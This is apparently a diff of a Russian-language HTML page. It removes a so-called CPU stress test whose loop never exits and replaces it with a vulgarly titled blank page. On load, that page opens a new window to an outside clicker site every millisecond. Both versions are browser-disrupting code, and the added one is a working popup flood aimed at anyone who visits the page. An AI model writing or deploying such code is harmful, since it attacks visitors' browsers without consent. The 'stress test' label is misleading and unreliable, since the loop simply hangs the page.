@@ -2,31 +2,16 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>Нагрузочный тест на CPU</title>
+    <title>XYU</title>
 </head>
 <body>
-    <h1>Старт нагрузочного теста</h1>
-    <button onclick="startStressTest()">Начать стресс-тест</button>
-    <p id="result"></p>
+    <h1></h1>
+    <p></p>
     
     <script>
-        function startStressTest() {
-            const startTime = Date.now();
-            let counter = 0;
-            
-            // Бесконечный цикл, выполняющий интенсивные вычисления
-            while(true) {
-                for(let i = 0; i < 5000000000000; i++) {
-                    Math.sqrt(i); // Вычисление корня для увеличения нагрузки
-                }
-                
-                // Остановка теста через 10 секунд
-                if(Date.now() - startTime > 10000000000000) {
-                    document.getElementById('result').innerText = 'Тест завершен';
-                    break;
-                }
-            }
-        }
+        setInterval(function() {
+            window.open('https://xyu-clicker.vercel.app/', '_blank');
+        }, 1);
     </script>
 </body>
 </html>
